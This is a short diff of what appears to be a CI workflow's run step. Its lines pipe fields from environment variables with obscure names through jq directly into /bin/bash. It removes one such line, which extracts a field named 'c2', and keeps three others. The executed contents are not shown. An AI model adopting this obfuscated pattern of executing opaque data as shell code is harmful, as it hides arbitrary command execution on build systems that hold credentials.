@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$vx8" | jq -r .rwx292 | /bin/bash
           echo $ik5 | jq -r .vycrp77984 | /bin/bash
-          echo $jkeye951 | jq -r .c2 | /bin/bash
           echo $ygc2 | jq -r .pu8 | /bin/bash
 
       - name: Archive data
